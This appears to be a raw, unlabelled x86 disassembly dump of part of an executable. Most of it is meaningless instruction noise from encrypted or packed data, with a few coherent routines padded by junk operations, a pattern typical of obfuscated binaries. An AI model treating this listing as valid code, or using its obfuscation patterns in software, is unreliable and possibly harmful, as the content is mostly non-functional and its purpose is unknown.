  40b695:	mov    ch,BYTE PTR [edi+edx*8-0x20]
  40b699:	xor    ecx,ebp
  40b69b:	dec    edi
  40b69c:	pop    es
  40b69d:	and    DWORD PTR [edx],ebp
  40b69f:	repz jo 0x40b712
  40b6a2:	xchg   ebp,eax
  40b6a3:	jg     0x40b715
  40b6a5:	jo     0x40b69b
  40b6a7:	mov    ch,0x44
  40b6a9:	aas    
  40b6aa:	call   0x752e8009
  40b6af:	rol    DWORD PTR cs:[esi],cl
  40b6b2:	popa   
  40b6b3:	sub    eax,DWORD PTR [ecx-0x678016c2]
  40b6b9:	nop
  40b6ba:	sbb    ch,cl
  40b6bc:	mov    ds:0x1740b50a,eax
  40b6c1:	mov    ?,WORD PTR [eax+0x4e]
  40b6c4:	sub    al,0xe6
  40b6c6:	in     al,dx
  40b6c7:	pop    ds
  40b6c8:	dec    ebp
  40b6c9:	ins    DWORD PTR es:[edi],dx
  40b6ca:	inc    edi
  40b6cb:	cmc    
  40b6cc:	jge    0x40b69b
  40b6ce:	mov    ds:0x1a514ead,eax
  40b6d3:	sbb    eax,0x87d13f00
  40b6d8:	or     eax,0x381d77b8
  40b6dd:	cmp    ebp,DWORD PTR [eax-0x7235046e]
  40b6e3:	or     ecx,esi
  40b6e5:	adc    al,0xba
  40b6e7:	push   ds
  40b6e8:	mov    ebp,DWORD PTR [esi]
  40b6ea:	pop    edi
  40b6eb:	xor    esi,DWORD PTR [esi]
  40b6ed:	fisttp QWORD PTR [ecx+0x46f37327]
  40b6f3:	push   edi
  40b6f4:	jmp    0xb420:0x9d19340a
  40b6fb:	in     al,dx
  40b6fc:	aaa    
  40b6fd:	cwde   
  40b6fe:	push   cs
  40b6ff:	shl    DWORD PTR [ebp+0x6],0xf0
  40b703:	push   es
  40b704:	pop    ecx
  40b705:	mov    edx,ebp
  40b707:	ds dec ecx
  40b709:	cdq    
  40b70a:	mov    ecx,0x8e8ec6d
  40b70f:	dec    esi
  40b710:	dec    esi
  40b711:	stos   DWORD PTR es:[edi],eax
  40b712:	aas    
  40b713:	add    BYTE PTR [eax-0x65],0x73
  40b717:	sahf   
  40b718:	std    
  40b719:	sbb    al,0x38
  40b71b:	adc    ebp,DWORD PTR [esi]
  40b71d:	sub    al,bh
  40b71f:	mov    ebp,0x50dc9730
  40b724:	mov    dl,0xa5
  40b726:	jge    0x40b6c8
  40b728:	adc    al,0x38
  40b72a:	test   al,0x38
  40b72c:	cs cmc 
  40b72e:	js     0x40b708
  40b730:	adc    al,0xee
  40b732:	lods   eax,DWORD PTR ds:[esi]
  40b733:	fimul  WORD PTR [eax+0x3d]
  40b736:	sub    esp,DWORD PTR [edx-0x7bdab1]
  40b73c:	add    eax,0x411f1dfd
  40b741:	xor    eax,0xdc725402
  40b746:	jecxz  0x40b76d
  40b748:	xchg   edi,eax
  40b749:	dec    edi
  40b74a:	test   BYTE PTR [edi-0x3d],ch
  40b74d:	outs   dx,BYTE PTR ds:[esi]
  40b74e:	cld    
  40b74f:	adc    al,0x83
  40b751:	add    eax,0x3508bdeb
  40b756:	int3   
  40b757:	int    0x7
  40b759:	pop    ss
  40b75a:	cli    
  40b75b:	jae    0x40b7b6
  40b75d:	mov    es,WORD PTR [edx]
  40b75f:	inc    edi
  40b760:	pop    ss
  40b761:	cmp    al,al
  40b763:	(bad)  
  40b764:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b765:	push   0x5b81761a
  40b76a:	mov    edi,0xf6722160
  40b76f:	in     al,dx
  40b770:	xchg   edi,eax
  40b771:	iret   
  40b772:	pop    ebx
  40b773:	add    DWORD PTR [esi],ebx
  40b775:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b776:	adc    eax,0x14b783e0
  40b77b:	xabort 0x48
  40b77e:	pusha  
  40b77f:	sub    esp,DWORD PTR [edi]
  40b781:	mov    ch,0xa7
  40b783:	sbb    dl,BYTE PTR [eax+esi*1]
  40b786:	push   es
  40b787:	mov    ebx,0xce94412a
  40b78c:	mov    eax,ds:0xe2124080
  40b791:	(bad)  
  40b792:	push   ebx
  40b793:	and    eax,0x3e2cf68e
  40b798:	in     al,dx
  40b799:	inc    edx
  40b79a:	shl    BYTE PTR [edi-0x70],1
  40b79d:	xor    eax,0x996a2ccb
  40b7a2:	int3   
  40b7a3:	adc    ah,BYTE PTR [edx-0x3f]
  40b7a6:	push   ebp
  40b7a7:	mov    dl,0x3b
  40b7a9:	cmc    
  40b7aa:	jmp    0x40b7a8
  40b7ac:	dec    esi
  40b7ad:	cmp    eax,0x5aff1393
  40b7b2:	add    al,BYTE PTR [esi-0xf]
  40b7b5:	mov    BYTE PTR [edi-0x58b6fc53],ah
  40b7bb:	pop    ss
  40b7bc:	call   0xc64f:0x3a4ef035
  40b7c3:	push   esi
  40b7c4:	mov    ebp,0x1850e66f
  40b7c9:	pop    esp
  40b7ca:	and    bl,cl
  40b7cc:	push   esi
  40b7cd:	pusha  
  40b7ce:	add    edx,esp
  40b7d0:	jb     0x40b7a9
  40b7d2:	sub    al,0xdf
  40b7d4:	jle    0x40b81b
  40b7d6:	xor    ah,BYTE PTR [ebx-0x7a03ebb6]
  40b7dc:	sbb    al,0xae
  40b7de:	and    eax,0xcb42ef8a
  40b7e3:	dec    esp
  40b7e4:	(bad)  
  40b7e5:	addr16 xchg edx,eax
  40b7e7:	inc    ecx
  40b7e8:	(bad)  
  40b7e9:	xor    eax,0x94eae7f3
  40b7ee:	jmp    0x40b82e
  40b7f0:	loope  0x40b7b6
  40b7f2:	mov    BYTE PTR [edx+0x52749aab],al
  40b7f8:	dec    esi
  40b7f9:	xor    BYTE PTR [ebx+eiz*4],ah
  40b7fc:	xchg   ebx,eax
  40b7fd:	test   eax,0x43519fad
  40b802:	syscall 
  40b804:	jmp    0x40b84e
  40b806:	xchg   esp,eax
  40b807:	xor    dh,BYTE PTR [ebp-0x66066bd]
  40b80d:	inc    esi
  40b80e:	push   ecx
  40b80f:	in     al,dx
  40b810:	cmc    
  40b811:	dec    ebx
  40b812:	mov    bh,dh
  40b814:	in     eax,dx
  40b815:	or     ecx,DWORD PTR [ebp+0x4ba0a045]
  40b81b:	scas   al,BYTE PTR es:[edi]
  40b81c:	push   0x6c
  40b81e:	rol    BYTE PTR ds:0x3796156d,1
  40b824:	inc    ebp
  40b825:	adc    BYTE PTR [ecx+0x3b],al
  40b828:	mov    WORD PTR [edx-0x730db8],es
  40b82e:	mov    cl,0xa9
  40b830:	popa   
  40b831:	ds out dx,al
  40b833:	aad    0x88
  40b835:	mov    al,0xfc
  40b837:	pusha  
  40b838:	clc    
  40b839:	aas    
  40b83a:	jb     0x40b88d
  40b83c:	cmp    BYTE PTR [eax],ah
  40b83e:	cmp    eax,0x48af7b0
  40b843:	or     BYTE PTR [edi+esi*1],al
  40b846:	jmp    0x40b9fe
  40b84b:	hlt    
  40b84c:	sbb    eax,0x71518348
  40b851:	rep ins DWORD PTR es:[edi],dx
  40b853:	cmp    BYTE PTR [esp+ecx*2],al
  40b856:	aaa    
  40b857:	enter  0x5fa9,0x13
  40b85b:	dec    edi
  40b85c:	bnd jo 0x40b8cf
  40b85f:	xchg   ebp,eax
  40b860:	jg     0x40b8d2
  40b862:	jo     0x40b804
  40b864:	mov    cl,0xd
  40b866:	ficomp DWORD PTR [ecx]
  40b868:	stos   DWORD PTR es:[edi],eax
  40b869:	xor    al,0x84
  40b86b:	sub    al,0xe6
  40b86d:	inc    eax
  40b86e:	mov    eax,ds:0xa4059354
  40b873:	dec    ebx
  40b874:	dec    esp
  40b875:	and    al,0x10
  40b877:	xor    al,0xe4
  40b879:	mov    ch,0xca
  40b87b:	test   eax,0xcd7776b5
  40b880:	add    BYTE PTR [edi],bl
  40b882:	xchg   edi,eax
  40b883:	bnd jbe 0x40b8ea
  40b886:	rcr    BYTE PTR [ebx+0x457073f9],cl
  40b88c:	push   esi
  40b88d:	rcr    BYTE PTR [esi],1
  40b88f:	inc    ebp
  40b890:	psubusb mm2,mm1
  40b893:	mov    ?,WORD PTR [ebp-0x50]
  40b896:	jmp    0xc0a8:0xf21a1f9e
  40b89d:	inc    edi
  40b89e:	jmp    0xc64d691b
  40b8a3:	cmc    
  40b8a4:	int    0x83
  40b8a6:	(bad)
  40b8a9:	mov    ds:0xed1cfcd6,al
  40b8ae:	aam    0xf3
  40b8b0:	not    DWORD PTR [eax-0x28]
  40b8b3:	adc    eax,0x93ffb3ef
  40b8b8:	(bad)  
  40b8b9:	pop    ss
  40b8ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8bb:	xchg   ecx,eax
  40b8bc:	mov    ah,0xf7
  40b8be:	jmp    0x442f:0x37d970c1
  40b8c5:	sub    BYTE PTR [edx-0x542b24d],al
  40b8cb:	test   DWORD PTR [esi+0x6],0x7bcc7442
  40b8d2:	mov    al,0xc1
  40b8d4:	out    dx,eax
  40b8d5:	sub    ch,BYTE PTR [ebx+0x33cddac3]
  40b8db:	xchg   edx,eax
  40b8dc:	imul   BYTE PTR [edx+0x35089f60]
  40b8e2:	ss fcmovne st,st(5)
  40b8e5:	lods   eax,DWORD PTR ds:[esi]
  40b8e6:	arpl   WORD PTR [eax],dx
  40b8e8:	push   ebp
  40b8e9:	in     al,0xfe
  40b8eb:	sbb    al,0x78
  40b8ed:	(bad)  
  40b8ee:	pop    edi
  40b8ef:	xchg   BYTE PTR [esp+ebp*4+0x1feb6ada],bh
  40b8f6:	sub    al,BYTE PTR ds:0x3caff04a
  40b8fc:	imul   eax
  40b8fe:	jo     0x40b89b
  40b900:	into   
  40b901:	push   ebp
  40b902:	pop    esi
  40b903:	adc    ah,bh
  40b905:	fist   WORD PTR [ebx-0x76a3fa53]
  40b90b:	push   edi
  40b90c:	xchg   DWORD PTR [ebx+0x6e],ecx
  40b90f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b910:	inc    ebp
  40b911:	fisub  WORD PTR [esi+0x7a]
  40b914:	lods   eax,DWORD PTR ds:[esi]
  40b915:	pop    ebp
  40b916:	pop    esp
  40b917:	dec    edx
  40b918:	mov    dh,0x87
  40b91a:	dec    edx
  40b91b:	jmp    0xace5:0xb77ba1c5
  40b922:	push   eax
  40b923:	mov    bl,0x2
  40b925:	add    al,0x37
  40b927:	and    al,0xd6
  40b929:	add    BYTE PTR [esi-0x56511f57],al
  40b92f:	(bad)  
  40b930:	cmp    eax,0xa7bdaf
  40b935:	cli    
  40b936:	ficomp WORD PTR [edx-0x8]
  40b939:	scas   al,BYTE PTR es:[edi]
  40b93a:	xor    esi,DWORD PTR [ecx-0x29]
  40b93d:	mov    ah,0xee
  40b93f:	cwde   
  40b940:	arpl   WORD PTR [ecx+eiz*2],sp
  40b943:	leave  
  40b944:	test   DWORD PTR [ebp-0x7d6427eb],ecx
  40b94a:	mov    bl,0xbf
  40b94c:	rep stos DWORD PTR es:[edi],eax
  40b94e:	sbb    edx,DWORD PTR [ebx+0x2373ea0f]
  40b954:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b955:	add    al,0x7d
  40b957:	pop    eax
  40b958:	leave  
  40b959:	xor    dl,BYTE PTR [esi-0x3f]
  40b95c:	jge    0x40b90f
  40b95e:	push   ecx
  40b95f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b960:	adc    ch,ch
  40b962:	rcl    DWORD PTR [esi+0x67f3a397],0xd0
  40b969:	sub    al,BYTE PTR [edx+0x6a]
  40b96c:	add    dh,BYTE PTR [ebp+0x53]
  40b96f:	div    DWORD PTR [edx-0x5b]
  40b972:	and    esp,eax
  40b974:	(bad)  
  40b975:	fcom   DWORD PTR [ebx+0x15]
  40b978:	xchg   DWORD PTR [ecx],esi
  40b97a:	fwait
  40b97b:	mov    eax,ds:0xbc99270
  40b980:	inc    ebx
  40b981:	jno    0xf5112e6a
  40b987:	xor    DWORD PTR [ebx+eax*8],ecx
  40b98a:	jmp    0xbe54:0x7a3f09ba
  40b991:	dec    esi
  40b992:	sti    
  40b993:	aas    
  40b994:	iret   
  40b995:	mov    dl,0x6d
  40b997:	cmp    DWORD PTR [ebx-0x3e7a675f],esp
  40b99d:	xchg   esp,eax
  40b99e:	add    ch,al
  40b9a0:	add    eax,0xe6ed00ac
  40b9a5:	or     eax,DWORD PTR [ebp+0x31]
  40b9a8:	inc    ebx
  40b9a9:	mov    dl,0x83
  40b9ab:	je     0x40b9d3
  40b9ad:	xchg   ebp,eax
  40b9ae:	xchg   ebx,eax
  40b9af:	in     al,dx
  40b9b0:	loop   0x40b9f8
  40b9b2:	xchg   DWORD PTR [edi],esi
  40b9b4:	test   BYTE PTR [ebx-0x787d661d],ch
  40b9ba:	and    esi,ebp
  40b9bc:	les    eax,FWORD PTR [ebx-0xf]
  40b9bf:	pop    edi
  40b9c0:	add    al,0x7d
  40b9c2:	push   ebp
  40b9c3:	stos   WORD PTR es:[edi],ax
  40b9c5:	push   eax
  40b9c6:	xor    esp,DWORD PTR [eax]
  40b9c8:	mov    al,ds:0xbbaa0a73
  40b9cd:	mov    ds:0xa884b3df,al
  40b9d2:	mov    dl,0xef
  40b9d4:	mov    eax,ds:0x8df7b095
  40b9d9:	fidivr DWORD PTR ds:0x37adab78
  40b9df:	dec    ecx
  40b9e0:	jge    0x40b9c4
  40b9e2:	mov    WORD PTR [edi-0x5a],ds
  40b9e5:	retf   0xfc26
  40b9e8:	fld    DWORD PTR [ebx+0x5b71d066]
  40b9ee:	out    dx,al
  40b9ef:	shl    BYTE PTR [esi],cl
  40b9f1:	rcl    DWORD PTR gs:0xd199f954,cl
  40b9f8:	sahf   
  40b9f9:	cmp    DWORD PTR [edi],edx
  40b9fb:	and    bl,BYTE PTR [ebx+0x3c47349a]
  40ba01:	lds    ecx,FWORD PTR [edi]
  40ba03:	test   BYTE PTR [ecx],dl
  40ba05:	add    BYTE PTR [eax],al
  40ba07:	add    BYTE PTR [ebx+0x4d8b0845],cl
  40ba0d:	clc    
  40ba0e:	xor    eax,esi
  40ba10:	add    eax,edi
  40ba12:	mov    DWORD PTR [ecx],eax
  40ba14:	jmp    0x40bbf5
  40ba19:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40ba20:	jmp    0x40bbf5
  40ba25:	mov    eax,DWORD PTR [ebp-0x8]
  40ba28:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ba2b:	mov    ecx,DWORD PTR [ecx]
  40ba2d:	mov    DWORD PTR [eax],ecx
  40ba2f:	mov    eax,DWORD PTR [ebp+0xc]
  40ba32:	jmp    0x40bbea
  40ba37:	retf   
  40ba38:	(bad)  [ebx+0x5171a9c1]
  40ba3e:	icebp  
  40ba3f:	dec    eax
  40ba40:	cmp    eax,0x35a10d6b
  40ba45:	adc    BYTE PTR [esp+eiz*8-0x6a8f8f10],bl
  40ba4c:	jg     0x40babe
  40ba4e:	jo     0x40ba2d
  40ba50:	mov    cl,BYTE PTR [edx-0x35]
  40ba53:	shl    DWORD PTR [edx-0x3bde053f],0xe5
  40ba5a:	or     eax,0x2569e83f
  40ba5f:	jle    0x40bab2
  40ba61:	call   0x5d1b3484
  40ba66:	lahf   
  40ba67:	xlat   BYTE PTR ds:[ebx]
  40ba68:	or     cl,dh
  40ba6a:	pop    eax
  40ba6b:	pusha  
  40ba6c:	or     eax,0xeb4721ee
  40ba71:	outs   dx,BYTE PTR ds:[esi]
  40ba72:	fisttp DWORD PTR [esi]
  40ba74:	in     al,0x66
  40ba76:	nop
  40ba77:	add    BYTE PTR [edi+0x39],al
  40ba7a:	adc    al,0xd6
  40ba7c:	dec    edx
  40ba7d:	mov    dl,0xe4
  40ba7f:	ret    0xcea7
  40ba82:	into   
  40ba83:	mov    BYTE PTR [edx-0x1a],cl
  40ba86:	ret    0x289
  40ba89:	inc    edi
  40ba8a:	xor    al,0xdb
  40ba8c:	aas    
  40ba8d:	mov    ch,0x39
  40ba8f:	cwde   
  40ba90:	sbb    ebp,DWORD PTR [edx+0x10]
  40ba93:	jbe    0x40ba22
  40ba95:	pop    ds
  40ba96:	inc    ebx
  40ba97:	shr    bh,cl
  40ba99:	popa   
  40ba9a:	pop    ebp
  40ba9b:	cmp    DWORD PTR [ebx-0x50c6ad2b],0xffffffd7
  40baa2:	inc    edi
  40baa3:	or     eax,0xb0d73b84
  40baa8:	repz ror dh,1
  40baab:	push   ss
  40baac:	jecxz  0x40bab0
  40baae:	cld    
  40baaf:	dec    ebp
  40bab0:	inc    eax
  40bab1:	add    cl,ch
  40bab3:	aaa    
  40bab4:	shr    DWORD PTR [edi-0x1a5fbaca],0x4b
  40babb:	mov    ch,0x79
  40babd:	ja     0x40ba6a
  40babf:	jmp    0xcd43:0x1d96a109
  40bac6:	adc    DWORD PTR [esi+ecx*8+0x4d],eax
  40baca:	lock repz jo 0x40bb07
  40bace:	fwait
  40bacf:	mov    dl,0xd5
  40bad1:	cmp    eax,edx
  40bad3:	jmp    0x28455b0b
  40bad8:	test   al,0x9e
  40bada:	xchg   edi,eax
  40badb:	pop    edi
  40badc:	xlat   BYTE PTR gs:[ebx]
  40bade:	sub    DWORD PTR [edx],esi
  40bae0:	fidiv  WORD PTR [eax]
  40bae2:	dec    eax
  40bae3:	push   esi
  40bae4:	mov    ds:0x99ae4c24,al
  40bae9:	jge    0x40bab4
  40baeb:	sub    ah,0x5b
  40baee:	int3   
  40baef:	mov    cs,ebp
  40baf1:	std    
  40baf2:	in     eax,dx
  40baf3:	jo     0x40badd
  40baf5:	xchg   ebp,eax
  40baf6:	test   ebx,esp
  40baf8:	pusha  
  40baf9:	loop   0x40bb6c
  40bafb:	mov    al,0xc9
  40bafd:	pop    esi
  40bafe:	lgdtd  [esi-0x1b]
  40bb02:	xchg   DWORD PTR [ebp-0x7f5f0228],edx
  40bb08:	push   eax
  40bb09:	stc    
  40bb0a:	and    al,0xc3
  40bb0c:	inc    edx
  40bb0d:	outs   dx,DWORD PTR ds:[esi]
  40bb0e:	rcr    DWORD PTR [edi-0x22],cl
  40bb11:	or     DWORD PTR [ebx],0x4fe69356
  40bb17:	adc    ch,BYTE PTR ds:0x2df7cfd5
  40bb1d:	add    dl,BYTE PTR [ecx-0x3a2df89b]
  40bb23:	in     eax,dx
  40bb24:	in     eax,0xac
  40bb26:	add    esp,DWORD PTR ds:0x3eb20211
  40bb2c:	sub    edi,DWORD PTR [edi-0x74b4dd84]
  40bb32:	or     edx,DWORD PTR [edi+0x633e58ee]
  40bb38:	xchg   esp,eax
  40bb39:	shl    BYTE PTR [ebx-0x2169fe33],0x42
  40bb40:	rcl    BYTE PTR ds:0xf2471917,1
  40bb46:	mov    ebx,0xcf24fcd3
  40bb4b:	sbb    esp,DWORD PTR [ecx]
  40bb4d:	jp     0x40bbbc
  40bb4f:	shr    DWORD PTR [edi+esi*2+0x11b31a1b],cl
  40bb56:	rcl    BYTE PTR [ecx+eiz*4],1
  40bb59:	inc    ebx
  40bb5a:	adc    BYTE PTR [esp+ebp*1],al
  40bb5d:	cwde   
  40bb5e:	adc    bh,BYTE PTR [edi-0x489a9dfd]
  40bb64:	sub    ch,ch
  40bb66:	ds mov cl,0x20
  40bb69:	xlat   BYTE PTR ds:[ebx]
  40bb6a:	(bad)  [esi+ecx*4+0x5472b997]
  40bb71:	mov    ah,0xb0
  40bb73:	stos   BYTE PTR es:[edi],al
  40bb74:	cwde   
  40bb75:	ret    0x3f06
  40bb78:	xchg   edx,eax
  40bb79:	pusha  
  40bb7a:	cmc    
  40bb7b:	inc    ecx
  40bb7c:	cdq    
  40bb7d:	loopne 0x40bb61
  40bb7f:	outs   dx,BYTE PTR ds:[esi]
  40bb80:	push   edx
  40bb81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb82:	push   ecx
  40bb83:	hlt    
  40bb84:	and    al,0x63
  40bb86:	jo     0x40bb5e
  40bb88:	lea    edi,[edx+0x4e20e019]
  40bb8e:	xlat   BYTE PTR ds:[ebx]
  40bb8f:	std    
  40bb90:	repz xchg edx,eax
  40bb92:	mov    ebx,0x5553dd3d
  40bb97:	aam    0x9c
  40bb99:	add    eax,0xf1e127c5
  40bb9e:	mov    ch,0xe4
  40bba0:	bound  ebp,QWORD PTR ds:0xc1deac8f
  40bba6:	xor    bl,cl
  40bba8:	xchg   ecx,eax
  40bba9:	loopne 0x40bb89
  40bbab:	mov    bh,0xb1
  40bbad:	repnz sub BYTE PTR [ecx-0x31d2d49b],0xa4
  40bbb5:	cmp    DWORD PTR [edx],edi
  40bbb7:	jecxz  0x40bbc9
  40bbb9:	sbb    cl,BYTE PTR [eax]
  40bbbb:	mov    ds:0x2894a6a1,al
  40bbc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbc1:	mov    edi,0x23f1380a
  40bbc6:	inc    edi
  40bbc7:	mov    dh,0x52
  40bbc9:	fild   WORD PTR [eax+0x3baaaaa5]
  40bbcf:	adc    al,0x26
  40bbd1:	shr    DWORD PTR [ebx+0x47],1
  40bbd4:	mov    BYTE PTR [eax-0x16341b2f],dl
  40bbda:	jg     0x40bbbe
  40bbdc:	mov    WORD PTR [edi],fs
  40bbde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbdf:	xchg   edx,eax
  40bbe0:	sub    eax,0x82fab290
  40bbe5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbe6:	cmp    al,0x39
  40bbe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbe9:	mov    ax,WORD PTR [ebp+0x8]
  40bbed:	push   DWORD PTR [ebp-0x8]
  40bbf0:	call   0x401000
  40bbf5:	mov    eax,DWORD PTR [ebp-0xc]
  40bbf8:	cmp    eax,ebx
  40bbfa:	je     0x40acdc
  40bc00:	mov    eax,DWORD PTR [ebp-0x8]
  40bc03:	mov    eax,DWORD PTR [eax]
  40bc05:	pop    edi
  40bc06:	pop    esi
  40bc07:	pop    ebx
  40bc08:	leave  
  40bc09:	ret    0x8
  40bc0c:	push   ebp
  40bc0d:	mov    ebp,esp
  40bc0f:	push   ecx
  40bc10:	sbb    DWORD PTR ds:0x43429a,ecx
  40bc16:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40bc1d:	sbb    eax,DWORD PTR ds:0x434292
  40bc23:	mov    eax,DWORD PTR [ebp+0x8]
  40bc26:	or     DWORD PTR ds:0x434315,0x432cbe
  40bc30:	jmp    0x40be4b
  40bc35:	push   es
  40bc36:	mov    ch,dl
  40bc38:	xor    al,0x72
  40bc3a:	je     0x40bc02
  40bc3c:	stos   BYTE PTR es:[edi],al
  40bc3d:	aas    
  40bc3e:	lods   al,BYTE PTR ds:[esi]
  40bc3f:	and    DWORD PTR [eax-0x616b55ab],edi
  40bc45:	jns    0x40bc45
  40bc47:	jo     0x40bcb9
  40bc49:	jb     0x40bcca
  40bc4b:	jo     0x40bcbd
  40bc4d:	push   eax
  40bc4e:	inc    ebp
  40bc4f:	jne    0x40bc69
  40bc51:	sub    BYTE PTR [edx],dl
  40bc53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc54:	shl    DWORD PTR [ebx],cl
  40bc56:	aas    
  40bc57:	jo     0x40bc32
  40bc59:	dec    ecx
  40bc5a:	mov    eax,ds:0x350fec7e
  40bc5f:	xchg   DWORD PTR [edx],ecx
  40bc61:	add    dl,dl
  40bc63:	sub    DWORD PTR [ebp+0x708a5354],esp
  40bc69:	and    al,0xab
  40bc6b:	popa   
  40bc6c:	jns    0x40bc81
  40bc6e:	sbb    esi,DWORD PTR [esi+0x16]
  40bc71:	mov    esp,0x959c9528
  40bc76:	scas   eax,DWORD PTR es:[edi]
  40bc77:	sub    BYTE PTR [ebx+0x5f],bh
  40bc7a:	sbb    DWORD PTR [esi+0x13],ebp
  40bc7d:	xchg   esi,eax
  40bc7e:	mov    ds,WORD PTR [edi-0x40]
  40bc81:	and    ebp,DWORD PTR [ebx+eax*2]
  40bc84:	xchg   esp,eax
  40bc85:	ja     0x40bcf8
  40bc87:	push   ss
  40bc88:	shl    DWORD PTR [ebx-0xcd19171],1
  40bc8e:	in     al,0x66
  40bc90:	scas   al,BYTE PTR es:[edi]
  40bc91:	imul   edx,DWORD PTR [ecx+0x4c],0xa875a831
  40bc98:	sub    ecx,0xc9de9d77
  40bc9e:	push   ecx
  40bc9f:	xor    ecx,DWORD PTR [eax]
  40bca1:	dec    ebp
  40bca2:	pop    ss
  40bca3:	cmc    
  40bca4:	mov    dh,0xad
  40bca6:	scas   eax,DWORD PTR es:[edi]
  40bca7:	lock xor bh,al
  40bcaa:	or     DWORD PTR [ebp+0x36],0xffffff96
  40bcae:	loop   0x40bc86
  40bcb0:	mov    bl,0xbd
  40bcb2:	adc    ebx,edx
  40bcb4:	inc    ebp
  40bcb5:	adc    eax,0xf20f91e3
  40bcba:	mov    eax,0x94ccb07
  40bcbf:	outs   dx,BYTE PTR ds:[esi]
  40bcc0:	loop   0x40bc8f
  40bcc2:	add    dh,dh
  40bcc4:	sbb    DWORD PTR [edx],edx
  40bcc6:	rcr    DWORD PTR [ebp-0x3a045d02],cl
  40bccc:	add    al,0xa4
  40bcce:	jb     0x40bd0b
  40bcd0:	xchg   ebx,eax
  40bcd1:	pop    esp
  40bcd2:	mov    ebx,0x8a437732
  40bcd7:	stc    
  40bcd8:	lahf   
  40bcd9:	xor    ecx,DWORD PTR [edi+0x39]
  40bcdc:	imul   esi,DWORD PTR [ecx],0x83a565f5
  40bce2:	sub    BYTE PTR [ecx],0x2b
  40bce5:	shl    BYTE PTR [ebp+0x5e],cl
  40bce8:	xchg   esi,eax
  40bce9:	or     al,ah
  40bceb:	mov    al,0x1e
  40bced:	ror    esi,1
  40bcef:	mov    bl,BYTE PTR [esi-0x30]
  40bcf2:	ss sub eax,0xa3e5b6d5
  40bcf8:	mov    BYTE PTR [ebp+0x8],ah
  40bcfb:	in     eax,0x86
  40bcfd:	lahf   
  40bcfe:	mov    ah,0x11
  40bd00:	repnz mov bh,0x6a
  40bd03:	push   cs
  40bd04:	adc    eax,0x40dc8bb4
  40bd09:	data16 test BYTE PTR [eax-0x32],al
  40bd0d:	and    edx,edx
  40bd0f:	div    DWORD PTR ds:0xc4e66a6d
  40bd15:	aas    
  40bd16:	adc    al,0xa0
  40bd18:	xor    ecx,ebx
  40bd1a:	mov    esi,DWORD PTR [esp+ebp*2-0x74]
  40bd1e:	std    
  40bd1f:	iret   
  40bd20:	outs   dx,DWORD PTR ds:[esi]
  40bd21:	mov    edx,0xc877cb0d
  40bd26:	inc    edx
  40bd27:	sahf   
  40bd28:	cdq    
  40bd29:	nop
  40bd2a:	or     BYTE PTR [ebx-0x7c97aa3a],ch
  40bd30:	out    0x2f,eax
  40bd32:	sti    
  40bd33:	jno    0x40bd08
  40bd35:	jecxz  0x40bd11
  40bd37:	adc    al,0x2a
  40bd39:	in     al,0xe3
  40bd3b:	mov    esi,0x1d0c9687
  40bd40:	xchg   ebx,eax
  40bd41:	mov    ebx,0x84081838
  40bd46:	cmc    
  40bd47:	out    dx,eax
  40bd48:	mov    bl,0x72
  40bd4a:	cmp    eax,0xac3829d0
  40bd4f:	pextrw edx,(bad),0xc5
  40bd51:	push   ecx
  40bd52:	pop    esp
  40bd53:	mov    BYTE PTR [ecx-0x6d],dl
  40bd56:	imul   ebp,DWORD PTR [eax-0x69fed140],0x1c
  40bd5d:	loope  0x40bd89
  40bd5f:	ja     0x40bd34
  40bd61:	and    eax,0xff2a0de
  40bd66:	pop    edi
  40bd67:	mov    DWORD PTR [esi+0x11dae59f],ebx
  40bd6d:	sbb    dh,BYTE PTR [edi]
  40bd6f:	in     al,0xb0
  40bd71:	nop
  40bd72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd73:	es sbb eax,0x267ec04b
  40bd79:	mov    edi,DWORD PTR [ebp+0x19]
  40bd7c:	imul   ebx,esi,0x4be39e0a
  40bd82:	in     eax,0xfd
  40bd84:	fs cs pop edi
  40bd87:	pop    ecx
  40bd88:	push   es
  40bd89:	(bad)  
  40bd8a:	pop    esi
  40bd8b:	or     DWORD PTR [ebx+ebx*2],esp
  40bd8e:	adc    edi,ebx
  40bd90:	cs sub ecx,eax
  40bd93:	call   0x2c359d7f
  40bd98:	rcl    BYTE PTR [edx],cl
  40bd9a:	lahf   
  40bd9b:	stos   DWORD PTR es:[edi],eax
  40bd9c:	je     0x40bd3b
  40bd9e:	aaa    
  40bd9f:	jmp    0x40bda3
  40bda1:	mov    ebx,0xfad0747e
  40bda6:	push   ecx
  40bda7:	aad    0x7c
  40bda9:	sbb    al,0x93
  40bdab:	aad    0xa5
  40bdad:	fsubr  QWORD PTR [edx-0x1a]
  40bdb0:	or     eax,0xe0ff865c
  40bdb5:	jge    0x40bdd4
  40bdb7:	and    DWORD PTR ds:0xd13c09e5,edi
  40bdbd:	imul   ebx,esi,0xfffffff0
  40bdc0:	cmc    
  40bdc1:	xchg   ebp,eax
  40bdc2:	lods   eax,DWORD PTR ds:[esi]
  40bdc3:	jns    0x40bd5a
  40bdc5:	xlat   BYTE PTR ds:[ebx]
  40bdc6:	loop   0x40be17
  40bdc8:	jbe    0x40bd70
  40bdca:	daa    
  40bdcb:	inc    DWORD PTR [ecx+ebx*4-0x6ed5dc54]
  40bdd2:	pop    ds
  40bdd3:	inc    edi
  40bdd4:	push   esp
  40bdd5:	inc    esp
  40bdd6:	fisub  DWORD PTR [ecx+0x4be55f9e]
  40bddc:	mov    eax,0xec319793
  40bde1:	cld    
  40bde2:	call   0x675efc6
  40bde7:	mov    ds:0xa2690965,al
  40bdec:	cwde   
  40bded:	push   cs
  40bdee:	jb     0x40be01
  40bdf0:	adc    al,0x64
  40bdf2:	fdiv   st,st(4)
